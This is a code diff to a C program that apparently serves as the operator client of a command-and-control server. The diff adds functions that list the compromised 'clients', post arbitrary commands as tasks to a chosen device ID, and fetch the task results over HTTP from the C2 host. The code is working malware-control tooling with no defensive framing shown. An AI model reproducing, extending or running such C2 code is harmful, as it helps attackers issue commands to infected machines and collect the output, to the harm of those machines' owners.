@@ -4,6 +4,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdint.h>
+#include <inttypes.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 
@@ -31,7 +32,6 @@ void send_http_request(int connection_fd, const char *method, const char *path, 
 
 	char headers[256];
 	int headers_length = sprintf(headers, "%s %s HTTP/1.1\r\nHost: c2\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n", method, path, request_body_length);
-
 	send(connection_fd, headers, (size_t)headers_length, 0);
 	if (request_body_length > 0) {
 		send(connection_fd, request_body, request_body_length, 0);
@@ -65,7 +65,6 @@ unsigned char *receive_http_response(int connection_fd, size_t *response_body_le
 	}
 
 	size_t header_length = (size_t)header_end + 4;
-
 	size_t content_length = 0;
 	char *content_length_header = strstr((const char *)response, "Content-Length:");
 	if (content_length_header != NULL) {
@@ -88,10 +87,59 @@ unsigned char *receive_http_response(int connection_fd, size_t *response_body_le
 	unsigned char *response_body = malloc(content_length + 1);
 	memcpy(response_body, response + header_length, content_length);
 	response_body[content_length] = 0;
-
 	free(response);
-
 	*response_body_length = content_length;
+	return response_body;
+
+}
+
+unsigned char *list_clients(struct in_addr c2_ip, uint16_t c2_port, size_t *response_body_length) {
+
+	int connection_fd = create_c2_connection(c2_ip, c2_port);
+	if (connection_fd < 0) {
+		*response_body_length = 0;
+		return NULL;
+	}
+
+	send_http_request(connection_fd, "GET", "/clients", NULL, 0);
+	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
+	close(connection_fd);
+	return response_body;
+
+}
+
+unsigned char *create_task(struct in_addr c2_ip, uint16_t c2_port, uint64_t device_id, const unsigned char *command, size_t command_length, size_t *response_body_length) {
+
+	char path[64];
+	sprintf(path, "/clients/%016" PRIx64 "/task", device_id);
+
+	int connection_fd = create_c2_connection(c2_ip, c2_port);
+	if (connection_fd < 0) {
+		*response_body_length = 0;
+		return NULL;
+	}
+
+	send_http_request(connection_fd, "POST", path, command, command_length);
+	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
+	close(connection_fd);
+	return response_body;
+
+}
+
+unsigned char *list_task_results(struct in_addr c2_ip, uint16_t c2_port, uint64_t device_id, size_t *response_body_length) {
+
+	char path[64];
+	sprintf(path, "/clients/%016" PRIx64 "/results", device_id);
+
+	int connection_fd = create_c2_connection(c2_ip, c2_port);
+	if (connection_fd < 0) {
+		*response_body_length = 0;
+		return NULL;
+	}
+
+	send_http_request(connection_fd, "GET", path, NULL, 0);
+	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
+	close(connection_fd);
 	return response_body;
 
 }
